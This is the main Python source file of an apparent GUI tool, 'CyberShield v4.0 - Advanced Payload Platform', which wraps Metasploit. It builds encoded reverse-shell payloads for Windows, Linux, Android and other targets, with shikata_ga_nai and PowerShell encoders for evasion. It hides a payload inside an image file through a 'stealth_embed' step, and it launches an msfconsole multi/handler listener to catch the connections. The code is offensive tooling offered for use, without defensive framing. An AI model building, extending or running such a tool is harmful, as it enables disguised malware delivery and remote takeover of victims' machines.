# main.py
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import os
import platform
import subprocess
import tempfile
from PIL import Image, ImageTk
from core.security_manager import SecurityManager
from core.advanced_operations import AdvancedOperations
from core.ui_components import SecureConsole, KeyManagerUI, ImagePreview, PayloadConfigUI, ReverseConfigUI

class CyberShieldApp:
    def __init__(self, root):
        self.root = root
        self.root.title("CyberShield v4.0 - Advanced Payload Platform")
        self.root.geometry("1400x900")
        
        # Initialize state variables first
        self.payload_path = ""
        self.image_path = ""
        self.output_path = ""
        self.output_type = tk.StringVar(value="exe")
        
        # Initialize core components
        self.security = SecurityManager()
        self.operations = AdvancedOperations(self.security)
        self.current_platform = platform.system()
        self.listener_process = None
        
        # Create widgets (console will be initialized here)
        self.create_widgets()
        self.create_menu()
        
        try:
            self.security.generate_keys()
            self.console.log("Security keys generated successfully", 'success')
        except Exception as e:
            self.console.log(f"Key generation error: {str(e)}", 'error')

    def configure_styles(self):
        """Modern UI styling with security colors"""
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TNotebook.Tab', font=('Helvetica', 10, 'bold'))
        self.style.configure('Danger.TButton', foreground='white', background='#dc3545')
        self.style.configure('Success.TButton', foreground='white', background='#28a745')
        self.style.configure('TLabelFrame', font=('Helvetica', 10, 'bold'))
        self.style.configure('Title.TLabel', font=('Helvetica', 12, 'bold'))

    def create_widgets(self):
        self.configure_styles()
        
        # Main container
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Left panel (configuration)
        left_panel = ttk.Frame(main_frame, width=400)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=False)

        # Right panel (preview and console)
        right_panel = ttk.Frame(main_frame)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # ===== CONSOLE (initialize first) =====
        console_frame = ttk.LabelFrame(right_panel, text="Operation Console", padding=10)
        console_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        self.console = SecureConsole(console_frame)
        self.console.pack(fill=tk.BOTH, expand=True)
        self.console.log("Application initialized", 'info')

        # ========== PAYLOAD CONFIGURATION ==========
        config_frame = ttk.LabelFrame(left_panel, text="Payload Configuration", padding=10)
        config_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        # Main configuration notebook
        config_notebook = ttk.Notebook(config_frame)
        config_notebook.pack(fill=tk.BOTH, expand=True)

        # 1. Basic Payload Settings Tab
        basic_frame = ttk.Frame(config_notebook)
        self.payload_config = PayloadConfigUI(basic_frame, self.console)
        self.payload_config.pack(fill=tk.BOTH, expand=True)
        config_notebook.add(basic_frame, text="Basic Settings")

        # 2. Advanced Encoding Tab
        encoding_frame = ttk.Frame(config_notebook)
        
        # Encoding options
        ttk.Label(encoding_frame, text="Encoder:", style='Title.TLabel').grid(row=0, column=0, sticky='w', pady=5)
        self.encoder_var = tk.StringVar()
        encoders = ["x86/shikata_ga_nai", "x86/countdown", "cmd/powershell_base64", "x64/xor", "php/base64"]
        encoder_combo = ttk.Combobox(encoding_frame, textvariable=self.encoder_var, values=encoders, state='readonly')
        encoder_combo.grid(row=0, column=1, sticky='ew', padx=5, pady=5)
        encoder_combo.current(0)

        ttk.Label(encoding_frame, text="Iterations:", style='Title.TLabel').grid(row=1, column=0, sticky='w', pady=5)
        self.iterations_var = tk.IntVar(value=3)
        ttk.Spinbox(encoding_frame, from_=1, to=10, textvariable=self.iterations_var).grid(row=1, column=1, sticky='ew', padx=5, pady=5)

        ttk.Label(encoding_frame, text="Bad Characters:", style='Title.TLabel').grid(row=2, column=0, sticky='w', pady=5)
        self.badchars_var = tk.StringVar(value="\\x00\\x0a\\x0d")
        ttk.Entry(encoding_frame, textvariable=self.badchars_var).grid(row=2, column=1, sticky='ew', padx=5, pady=5)

        config_notebook.add(encoding_frame, text="Encoding")

        # 3. Platform/Architecture Tab
        platform_frame = ttk.Frame(config_notebook)
        
        # Platform selection
        ttk.Label(platform_frame, text="Target Platform:", style='Title.TLabel').grid(row=0, column=0, sticky='w', pady=5)
        self.platform_var = tk.StringVar(value="windows")
        platforms = ["windows", "linux", "mac", "android", "php", "java"]
        ttk.Combobox(platform_frame, textvariable=self.platform_var, values=platforms, state='readonly').grid(row=0, column=1, sticky='ew', padx=5, pady=5)

        # Architecture selection
        ttk.Label(platform_frame, text="Architecture:", style='Title.TLabel').grid(row=1, column=0, sticky='w', pady=5)
        self.arch_var = tk.StringVar(value="x86")
        architectures = ["x86", "x64", "arm", "mips", "ppc"]
        ttk.Combobox(platform_frame, textvariable=self.arch_var, values=architectures, state='readonly').grid(row=1, column=1, sticky='ew', padx=5, pady=5)

        # Output format
        ttk.Label(platform_frame, text="Output Format:", style='Title.TLabel').grid(row=2, column=0, sticky='w', pady=5)
        self.format_var = tk.StringVar(value="exe")
        formats = ["exe", "dll", "elf", "apk", "jar", "ps1", "py", "raw"]
        ttk.Combobox(platform_frame, textvariable=self.format_var, values=formats, state='readonly').grid(row=2, column=1, sticky='ew', padx=5, pady=5)

        config_notebook.add(platform_frame, text="Platform")

        # ========== LISTENER CONFIGURATION ==========
        listener_frame = ttk.LabelFrame(left_panel, text="Listener Configuration", padding=10)
        listener_frame.pack(fill=tk.X, pady=5)
        
        self.reverse_config = ReverseConfigUI(listener_frame, self.console)  # Fixed: Now passing console
        self.reverse_config.pack(fill=tk.X)

        # Auto-start listener option
        self.auto_listener_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(listener_frame, text="Auto-start listener after generation", 
                      variable=self.auto_listener_var).pack(pady=5)

        # ========== FILE OPERATIONS ==========
        file_frame = ttk.LabelFrame(left_panel, text="File Operations", padding=10)
        file_frame.pack(fill=tk.X, pady=5)
        
        ttk.Button(file_frame, text="📤 Upload Template", command=self.load_template).pack(fill=tk.X, pady=2)
        ttk.Button(file_frame, text="🖼️ Upload Image", command=self.load_image).pack(fill=tk.X, pady=2)
        ttk.Button(file_frame, text="📂 Select Output Directory", command=self.select_output_dir).pack(fill=tk.X, pady=2)

        # ========== KEY MANAGEMENT ==========
        key_frame = ttk.LabelFrame(left_panel, text="Cryptographic Controls", padding=10)
        key_frame.pack(fill=tk.X, pady=5)
        
        self.key_manager = KeyManagerUI(key_frame, self.security, self.console)
        self.key_manager.frame.pack(fill=tk.X)

        # ========== PREVIEW PANEL ==========
        preview_frame = ttk.LabelFrame(right_panel, text="Payload Preview", padding=10)
        preview_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.preview = ImagePreview(preview_frame, self.console)
        self.preview.pack(fill=tk.BOTH, expand=True)

        # ========== ACTION BUTTONS ==========
        action_frame = ttk.Frame(main_frame)
        action_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(action_frame, text="⚡ Generate Payload", 
                 command=self.generate_payload, style='Success.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="📡 Start Listener", 
                 command=self.start_listener, style='Danger.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="💾 Save Payload", 
                 command=self.save_output).pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="🔄 Reset Session", 
                 command=self.reset_session).pack(side=tk.RIGHT, padx=5)

    def generate_payload(self):
        """Handle payload generation with current config"""
        try:
            config = {
                "lhost": self.reverse_config.lhost_var.get(),
                "lport": self.reverse_config.lport_var.get(),
                "payload": self.payload_config.config['payload_type'].get(),
                "platform": self.payload_config.config['platform'].get(),
                "arch": self.payload_config.config['arch'].get(),
                "encoder": self.encoder_var.get(),
                "iterations": self.iterations_var.get(),
                "format": self.payload_config.config['format'].get(),
                "stageless": self.payload_config.config['stageless'].get()
            }

            # Validate configuration
            if not config['lhost']:
                raise ValueError("LHOST cannot be empty")
            if not config['lport'].isdigit():
                raise ValueError("LPORT must be a valid number")

            self.console.log("Starting payload generation...", 'info')
            
            # Generate payload
            payload_path = self.operations.generate_payload(config)
            self.payload_path = payload_path
            self.console.log(f"Payload generated: {os.path.basename(payload_path)}", 'success')
            
            # Embed in image if selected
            if self.image_path:
                output_path = self.operations.stealth_embed(
                    payload_path, 
                    self.image_path,
                    self.security.encryption_key
                )
                self.output_path = output_path
                self.console.log(f"Payload embedded in image: {os.path.basename(output_path)}", 'success')
                self.show_success_message()
            else:
                self.output_path = payload_path
                self.console.log("Payload generated without image embedding", 'info')

        except Exception as e:
            self.console.log(f"Error during payload generation: {str(e)}", 'error')
            messagebox.showerror("Generation Error", str(e))

    def start_listener(self):
        """Start Metasploit listener handler"""
        lhost = self.reverse_config.lhost_var.get()
        lport = self.reverse_config.lport_var.get()
        payload = self.payload_config.config['payload_type'].get()
        
        try:
            if not lhost:
                raise ValueError("LHOST cannot be empty")
            if not lport.isdigit():
                raise ValueError("LPORT must be a valid number")

            if self.listener_process and self.listener_process.poll() is None:
                self.console.log("Listener already running", 'warning')
                return

            rc_content = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
exploit -j
"""
            with tempfile.NamedTemporaryFile(delete=False, suffix='.rc') as rc_file:
                rc_file.write(rc_content.encode())
            
            self.listener_process = subprocess.Popen(
                ["msfconsole", "-q", "-r", rc_file.name],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self.console.log(f"Listener started on {lhost}:{lport}", 'success')
            
        except Exception as e:
            self.console.log(f"Listener error: {str(e)}", 'error')
            messagebox.showerror("Listener Error", str(e))

    def load_image(self):
        img_types = [
            ('Image files', '*.jpg *.jpeg *.png *.bmp *.gif *.webp'),
            ('All files', '*.*')
        ]
        path = filedialog.askopenfilename(filetypes=img_types)
        if path:
            try:
                with Image.open(path) as img:
                    img.verify()
                    self.image_path = path
                    self.preview.load_image(path)
                    self.console.log(f"Image loaded: {os.path.basename(path)}", 'success')
            except Exception as e:
                self.console.log(f"Invalid image: {str(e)}", 'error')
                messagebox.showerror("Image Error", f"Invalid image file: {str(e)}")

    def load_template(self):
        file_types = [
            ('Template files', '*.exe *.dll *.bin *.raw'),
            ('All files', '*.*')
        ]
        path = filedialog.askopenfilename(filetypes=file_types)
        if path:
            self.payload_config.config['template'].set(path)
            self.console.log(f"Template loaded: {os.path.basename(path)}", 'success')

    def save_output(self):
        if not self.output_path:
            self.console.log("No output generated yet", 'warning')
            messagebox.showwarning("Save Error", "No output generated yet")
            return

        file_types = [
            ('Executable', '*.exe'),
            ('JPEG Image', '*.jpg'),
            ('All files', '*.*')
        ]
        
        path = filedialog.asksaveasfilename(
            defaultextension=".exe",
            filetypes=file_types
        )
        
        if path:
            try:
                self.operations.save_output(self.output_path, path)
                self.console.log(f"File saved to: {path}", 'success')
                messagebox.showinfo("Success", "File saved successfully")
            except Exception as e:
                self.console.log(f"Save error: {str(e)}", 'error')
                messagebox.showerror("Save Error", str(e))

    def create_menu(self):
        menubar = tk.Menu(self.root)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        file_menu.add_command(label="New Session", command=self.reset_session)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        menubar.add_cascade(label="File", menu=file_menu)

        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        tools_menu.add_command(label="Key Manager", command=self.show_key_manager)
        menubar.add_cascade(label="Tools", menu=tools_menu)

        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        help_menu.add_command(label="About", command=self.show_about)
        menubar.add_cascade(label="Help", menu=help_menu)

        self.root.config(menu=menubar)

    def reset_session(self):
        self.payload_path = ""
        self.image_path = ""
        self.output_path = ""
        self.preview.clear()
        self.console.log("Session reset", 'info')
        messagebox.showinfo("Session Reset", "All session data has been cleared")

    def show_key_manager(self):
        key_window = tk.Toplevel(self.root)
        key_window.title("Key Management")
        KeyManagerUI(key_window, self.security, self.console)

    def show_about(self):
        about_text = "CyberShield v4.0\nAdvanced Payload Platform\n\nSecurity Framework"
        messagebox.showinfo("About CyberShield", about_text)

    def show_success_message(self):
        self.preview.create_text(
            self.preview.winfo_width()//2,
            self.preview.winfo_height()//2,
            text="✅ Operation Successful!",
            fill="green",
            font=('Helvetica', 24, 'bold')
        )

if __name__ == "__main__":
    root = tk.Tk()
    app = CyberShieldApp(root)
    root.mainloop()